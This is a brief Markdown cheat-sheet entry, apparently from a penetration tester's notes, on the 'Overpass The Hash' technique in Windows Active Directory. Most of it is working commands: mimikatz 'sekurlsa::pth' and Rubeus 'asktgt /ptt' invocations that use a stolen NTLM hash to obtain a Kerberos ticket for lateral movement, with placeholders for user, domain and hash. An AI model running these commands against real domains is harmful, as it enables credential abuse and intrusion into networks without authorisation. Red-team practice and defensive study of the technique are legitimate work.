---
id: Overpass The Hash
aliases:
  - Overpass The Hash
tags:
  - windows
  - AD
  - lateral
  - kerberos
  - ntlm
---
Gain a Kerberos TGT from a NTLM hash, then use it to forge a TGS.
## With mimikatz.exe

1. In mimikatz:
```mimikatz
privilege::debug
sekurlsa::pth /user:$TARGET_USER /domain:$DOMAIN /ntlm:$TARGET_HASH /run:powershell
```

2. Create a TGT by accessing a share on target
3. Check that the ticket was created with `klist`

## With Rubeus
```cmd
.\Rubeus.exe asktgt /domain:$DOMAIN /user:$TARGET_USER /rc4:$TARGET_HASH /ptt
```

Check that the ticket was created with `klist`
